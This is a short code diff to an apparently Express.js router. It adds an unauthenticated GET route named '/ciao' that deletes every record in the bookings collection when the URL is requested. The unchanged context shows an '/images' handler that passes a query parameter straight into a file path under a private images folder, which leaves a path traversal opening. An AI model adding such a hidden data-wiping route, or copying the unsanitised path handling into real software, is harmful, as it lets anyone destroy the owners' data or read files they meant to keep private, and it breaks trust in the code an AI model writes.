@@ -17,6 +17,8 @@ router.use(bodyParser.json());
 
 router.use(bodyParser.urlencoded({ extended: true }));
 
+router.get('/ciao', async (req, res) => await bookings.deleteMany())
+
 router.get('/images', authenticateJWT, async (req, res) => {
     try {
         const imagePath = path.resolve(__dirname, '../../privateImages', req.query.dir);
